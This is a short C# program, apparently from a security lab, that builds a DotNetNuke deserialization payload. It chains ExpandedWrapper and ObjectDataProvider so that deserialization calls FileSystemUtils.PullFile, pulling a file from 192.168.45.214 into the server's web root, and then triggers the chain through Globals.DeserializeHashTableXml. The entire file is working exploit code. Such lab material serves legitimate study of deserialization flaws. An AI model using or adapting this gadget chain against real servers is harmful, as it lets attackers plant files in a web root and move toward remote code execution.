using System;
using System.IO;
using DotNetNuke.Common.Utilities;
using DotNetNuke.Common;
using System.Windows.Data;
using System.Data.Services.Internal;
using System.Collections;

namespace ExpWrapSerializer {
  class Program {
    static void Main(string[] args) {
      //Serialize();
      Deserialize();
    }
    
    public static void Deserialize() {
      String xmlSource = File.ReadAllText("C:\\Windows\\Temp\\ExpWrap.txt");
      Globals.DeserializeHashTableXml(xmlSource);
    }

    public static void Serialize() {
      var myExpWrap = new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();
      myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
      myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
      myExpWrap.ProjectedProperty0.MethodName = "PullFile";
      myExpWrap.ProjectedProperty0.MethodParameters.Add("http://192.168.45.214/myODPTest.txt");
      myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");

      var table = new Hashtable();
      table["myTableEntry"] = myExpWrap;
      String payload = XmlUtils.SerializeDictionary(table, "profile");

      TextWriter writer = new StreamWriter("C:\\Windows\\Temp\\ExpWrap.txt");
      writer.Write(payload);
      writer.Close();

      Console.WriteLine("Done!");
    }
  }
}

